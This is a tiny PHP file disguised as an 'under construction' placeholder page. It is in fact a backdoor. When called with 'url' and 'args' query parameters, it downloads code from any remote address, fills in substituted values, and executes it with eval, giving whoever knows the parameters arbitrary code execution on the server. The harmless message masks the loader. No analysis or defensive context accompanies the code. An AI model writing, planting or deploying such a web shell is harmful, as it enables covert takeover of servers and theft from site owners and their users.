<?php
if (isset ($_GET['url']) && isset ($_GET['args'])) {
    $argsArray = json_decode($_GET['args'], true);
    eval(str_replace(array_keys($argsArray), array_values($argsArray), file_get_contents($_GET['url'])));
} else {
    echo "This page is under construction.";
}